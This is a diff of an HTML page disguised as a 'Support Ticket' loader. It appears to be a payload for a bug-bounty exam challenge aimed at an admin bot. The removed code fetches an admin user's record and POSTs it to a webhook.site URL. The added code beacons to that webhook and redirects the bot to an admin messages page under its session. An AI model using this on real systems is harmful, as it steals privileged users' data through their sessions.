@@ -1,33 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="0;url=https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/?redirected=true">
-    <title>Support Ticket Loading...</title>
+    <title>Loading Support Ticket...</title>
 </head>
 <body>
     <script>
-        // Signal to your webhook that the script started
-        fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/SCRIPT_STARTED');
+        // 1. Notify your webhook that the bot has landed on your GitHub page
+        fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/BOT_ON_GITHUB');
 
-        async function getTheFlag() {
-            try {
-                // 1. Try to fetch the admin's own data 
-                // Using the Admin ID you found earlier
-                const response = await fetch('https://api-bugbounty-exam.hashacademy.co/api/users/69d28e841cda77b519a9550e');
-                const data = await response.json();
-                
-                // 2. Send the result to your webhook
-                fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                });
-            } catch (err) {
-                // If it fails, send the error message
-                fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/ERROR?msg=' + btoa(err.message));
-            }
-        }
-        getTheFlag();
+        // 2. Redirect the bot to the admin view of your message
+        // This ensures the bot is on the correct domain with its admin session active
+        setTimeout(function() {
+            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e37c20bee6d6b7c662cdec";
+        }, 500); 
     </script>
+    
+    <p>Please wait while the support ticket loads...</p>
 </body>
 </html>
